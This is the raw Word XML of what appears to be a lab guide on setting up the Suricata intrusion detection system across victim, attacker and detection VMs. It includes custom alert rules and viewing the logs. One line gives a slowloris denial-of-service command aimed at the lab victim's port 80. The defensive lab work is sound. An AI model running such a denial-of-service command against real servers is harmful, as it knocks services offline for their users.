      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E60977" w14:textId="77777777" w:rsidR="00EF3D1C" w:rsidRPr="00EF3D1C" w:rsidRDefault="00EF3D1C" w:rsidP="00A302C5">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10 -p 80 -s 1000 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sleeptime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00EF3D1C">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 200</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E64C9C6" w14:textId="49799215" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00DD27AB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Alert</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Activity Detected.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD27AB">
        <w:br/>
        <w:t xml:space="preserve">Signature: alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> -&gt; any 80 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>:"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t>Slowloris</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD27AB">
        <w:t xml:space="preserve"> Activity Detected"; sid:1000011;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FC969A" w14:textId="3012D1D1" w:rsidR="00DD27AB" w:rsidRPr="00DD27AB" w:rsidRDefault="00A302C5" w:rsidP="00A302C5">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="661CF4BA" wp14:editId="11457128">
            <wp:extent cx="5573395" cy="452120"/>
            <wp:effectExtent l="0" t="0" r="8255" b="5080"/>
            <wp:docPr id="214194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45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DF83" w14:textId="213018FE" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t>Make Suricata work correctly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B6A89D" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1. Configure Network Interface</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="656F6AF8" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>Ensure all Virtual Machines (VMs) are configured to be in the same network, with the following IP addresses:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E67A76C" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Victim</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698ED9AF" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Attacker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28420DBB" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Detection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09157BC7" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>For this, use the following command to ensure the network interfaces are up:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183A47A7" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> eth0 192.168.1.xx netmask 255.255.255.0 up</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDB9AA7" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>Replace xx with the respective digits (10, 20, or 30) for each VM.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C8A900" w14:textId="1125A012" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B"/>
    <w:p w14:paraId="42081E8C" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">2. Configure Suricata </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Detection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4C88A784" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:t>Open the Suricata configuration file:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318F57CF" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sudo nano /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/suricata/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>suricata.yaml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="63286668" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add the custom rules file</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> to the configuration under rule-files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FED8531" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="000A7842">
        <w:t>rule-files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761B615E" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="000A7842">
        <w:t xml:space="preserve">  - /etc/suricata/rules/custom.rules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137358AC" w14:textId="5F8218BE" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A7842">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>- /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/suricata/rules/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>suricata.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4B1D8C56" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Configure the packet capture settings:</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> Make sure Suricata listens to the correct interface (in this case, eth0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479D8E84" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>af</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>-packet:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02713E8A" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve">  - interface: eth0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D78ECC7" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve">    cluster-id: 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3320746C" w14:textId="34B54F19" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve">    cluster-type: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>cluster_flow</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7F1F33D0" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve">    fanout: no</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8431F3" w14:textId="2AA82F26" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B"/>
    <w:p w14:paraId="607D274B" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3. Add Custom Rules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C59575E" w14:textId="686A446B" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>Now, add custom rules to detect</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> intrusions</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7972EF" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sudo nano /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/suricata/rules/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>custom.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="303B2719" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>Add some basic detection rules, for example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6857AF9D" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t># ICMP Echo Request (Ping) Detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06F90975" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">alert </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>icmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> -&gt; any </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>any</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:t>:"ICMP Echo Request (Ping) Detected"; itype:8; sid:1000001;)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390E6A40" w14:textId="4FCFB7D4" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B"/>
    <w:p w14:paraId="790EE864" w14:textId="6ECC1CA0" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>4. Restart Suricata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF63578" w14:textId="13538202" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve">After modifying the rules, </w:t>
      </w:r>
      <w:r>
        <w:t>restart</w:t>
      </w:r>
      <w:r w:rsidRPr="0023620B">
        <w:t xml:space="preserve"> Suricata:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFD5F5F" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sudo suricata -T -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/suricata/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>suricata.yaml</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2144810B" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="000A7842">
        <w:t>sudo systemctl restart suricata</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C174D53" w14:textId="05AF3928" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B"/>
    <w:p w14:paraId="04FE4A30" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5. View Suricata Alerts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A70CF88" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:r w:rsidRPr="0023620B">
        <w:t>You can view the detection alerts generated by Suricata using the following commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F730E06" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>tail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/log/suricata/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>eve.json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="62EF993F" w14:textId="77777777" w:rsidR="0023620B" w:rsidRPr="0023620B" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>tail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0023620B">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>/log/suricata/fast.log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="719B42D8" w14:textId="72466236" w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidRDefault="0023620B" w:rsidP="0023620B">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="0023620B" w:rsidRPr="000A7842" w:rsidSect="00C46E7D">
      <w:headerReference w:type="default" r:id="rId22"/>
      <w:footerReference w:type="default" r:id="rId23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A19B5" w14:textId="77777777" w:rsidR="0005156B" w:rsidRPr="00995558" w:rsidRDefault="0005156B" w:rsidP="00C50246">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00995558">
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="24152C40" w14:textId="77777777" w:rsidR="0005156B" w:rsidRPr="00995558" w:rsidRDefault="0005156B" w:rsidP="00C50246">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="0099555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9F743" w14:textId="77777777" w:rsidR="0041334B" w:rsidRPr="00995558" w:rsidRDefault="00086720" w:rsidP="00086720">
    <w:pPr>
      <w:pStyle w:val="PiedepginaAsignatura"/>
      <w:ind w:firstLine="0"/>
      <w:jc w:val="both"/>
    </w:pPr>
